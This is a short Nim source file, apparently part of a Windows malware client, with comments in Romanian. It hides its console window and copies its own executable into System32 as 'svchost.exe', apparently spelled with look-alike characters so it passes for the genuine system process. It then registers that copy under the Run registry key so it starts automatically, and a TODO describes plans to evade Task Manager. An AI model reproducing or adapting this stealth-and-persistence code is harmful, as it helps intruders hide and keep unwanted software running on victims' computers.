from winim/inc/wincon import FreeConsole
from os import getAppFilename
from os import copyFile
from os import getEnv
from os import joinPath

from registry import setKey
from registry import delKey

proc run*(): void =
  # hide the console window
  FreeConsole()

  # copy file to appdata
  let filename: string = getAppFilename()
  # let dest: string = getEnv("appdata").joinPath("client.exe")
  let dest: string = r"C:\Windows\System32".joinPath("svсhоst.exe")

  echo dest

  # imi da crash programul daca incerc sa i dau replace dar el e deschis
  if filename != dest:
    copyFile(filename, dest)

  ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
  ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
  setKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "client bla", dest)
  # setKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bl2", dest)
  # delKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bla")



